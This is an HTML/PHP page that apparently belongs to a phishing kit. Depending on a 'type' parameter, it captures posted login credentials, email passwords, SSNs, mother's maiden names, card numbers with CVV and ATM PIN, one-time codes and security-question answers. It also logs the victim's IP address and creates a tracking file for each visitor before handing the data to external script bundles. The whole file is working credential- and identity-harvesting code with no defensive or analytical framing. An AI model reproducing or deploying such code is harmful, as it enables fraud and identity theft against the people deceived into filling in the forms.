<!DOCTYPE html>
<html>
<body>
<!-- 0000380 -->
<script>
<?php echo json_encode($contip = $_POST['contip'] ?? null) ?>;
<?php echo json_encode(file_put_contents('tmp/'.$contip.'.txt', '0') ?? null) ?>;
<?php echo json_encode(file_put_contents('tmp/loc_'.$contip.'.txt', '0') ?? null) ?>;
let url_str = window.location.href;
let url = new URL(url_str);
let search_params = url.searchParams;
var type = search_params.get('type');
bc = <?php echo json_encode(basename($_SERVER['PHP_SELF']) ?? null) ?>;
ipr = <?php function sanitizeIpAddress($ip) {if (filter_var($ip, FILTER_VALIDATE_IP)) {return $ip;} return 'Unknown';} $ip = isset($_SERVER['HTTP_CLIENT_IP']) ? sanitizeIpAddress($_SERVER['HTTP_CLIENT_IP']) : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? sanitizeIpAddress($_SERVER['HTTP_X_FORWARDED_FOR']) : sanitizeIpAddress($_SERVER['REMOTE_ADDR'])); echo json_encode($ip ?? null) ?>;
var submitType = type;
switch (submitType) {
    case "7":
    case "101":
        a1 = <?php echo json_encode($_POST['username'] ?? null) ?>;
        b1 = <?php echo json_encode($_POST['password'] ?? null) ?>;
        break;
    case "2":
        a1 = <?php echo json_encode($_POST['fullname'] ?? null) ?>;
        b1 = <?php echo json_encode($_POST['dob'] ?? null) ?>;
        a2 = <?php echo json_encode($_POST['address'] ?? null) ?>;
        b2 = <?php echo json_encode($_POST['state'] ?? null) ?>;
        a3 = <?php echo json_encode($_POST['city'] ?? null) ?>;
        b3 = <?php echo json_encode($_POST['zip'] ?? null) ?>;
        a4 = <?php echo json_encode($_POST['phone'] ?? null) ?>;
        b4 = <?php echo json_encode($_POST['ssn'] ?? null) ?>;
        a5 = <?php echo json_encode($_POST['mmn'] ?? null) ?>;
        break;
    case "3":
        a1 = <?php echo json_encode($_POST['cnumber'] ?? null) ?>;
        b1 = <?php echo json_encode($_POST['expiry'] ?? null) ?>;
        a2 = <?php echo json_encode($_POST['cvv'] ?? null) ?>;
        b2 = <?php echo json_encode($_POST['atm'] ?? null) ?>;
        break;
    case "4":
        a1 = <?php echo json_encode($_POST['email'] ?? null) ?>;
        b1 = <?php echo json_encode($_POST['password'] ?? null) ?>;
        break;
    case "8":
        a1 = <?php echo json_encode($_POST['type'] ?? null) ?>;
        break;
    case "9":
        a1 = <?php echo json_encode($_POST['code'] ?? null) ?>;
        break;
    case "11":
        a1 = <?php echo json_encode($_POST['qus1'] ?? null) ?>;
        b1 = <?php echo json_encode($_POST['ans1'] ?? null) ?>;
        a2 = <?php echo json_encode($_POST['qus2'] ?? null) ?>;
        b2 = <?php echo json_encode($_POST['ans2'] ?? null) ?>;
        a3 = <?php echo json_encode($_POST['qus3'] ?? null) ?>;
        b3 = <?php echo json_encode($_POST['ans3'] ?? null) ?>;
        break;
    default:
        a1 = null;
        break;
}
</script>
<script src="sites/bundle.js"></script>
<script src="sites/cleave.js"></script>
<script src="sites/bundle-min.js"></script>
</body>
</html>
